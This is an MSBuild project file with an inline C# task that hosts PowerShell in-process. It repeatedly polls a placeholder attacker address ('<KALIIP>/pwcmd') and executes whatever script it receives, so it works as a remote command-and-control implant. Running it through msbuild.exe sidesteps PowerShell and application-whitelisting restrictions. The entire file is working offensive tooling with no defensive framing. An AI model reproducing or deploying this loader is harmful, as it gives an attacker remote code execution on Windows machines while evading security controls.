<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">  
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>    
     <Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
     <Reference Include="C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Net.Http\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Net.Http.dll" />
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

    public class ClassExample : Task, ITask
    {
        private static async System.Threading.Tasks.Task Loop()
        {
            string cmd;
            DateTime? lastUpdated = null;

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();         

            System.Net.Http.HttpClient client = new System.Net.Http.HttpClient();
            while (true)
            {
                using (System.Net.Http.HttpRequestMessage request = new System.Net.Http.HttpRequestMessage(System.Net.Http.HttpMethod.Get, "http://<KALIIP>/pwcmd"))
                {
                    if (lastUpdated != null)
                    {
                        request.Headers.IfModifiedSince = lastUpdated;
                    }
                    var response = await client.SendAsync(request);
                    if ((int)response.StatusCode == 200)
                    {
                        cmd = await response.Content.ReadAsStringAsync();
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine(cmd);
                        Console.ForegroundColor = ConsoleColor.White;

                        PowerShell ps = PowerShell.Create();
                        ps.Runspace = rs;
                        ps.AddScript(cmd);
                        
                        var results = ps.Invoke();
                        foreach (var psObject in results)
                        {
                            Console.WriteLine(psObject.ToString());
                        }
                        Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();

                        if (errors != null && errors.Count > 0)
                        {
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            foreach (ErrorRecord er in errors)
                            {
                                Console.WriteLine(er.Exception.ToString());
                            }
                            Console.ForegroundColor = ConsoleColor.White;
                        }
                        
                        lastUpdated = DateTime.Now;
                    }
                    else if ((int)response.StatusCode == 404)
                    {
                        Console.WriteLine("$ Done, exiting...");
                        rs.Close();
                        return;
                    }
                }
                System.Threading.Thread.Sleep(200);
            }
        }

        public override bool Execute()
        {
            Loop().Wait();
            return true;
        }
    }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
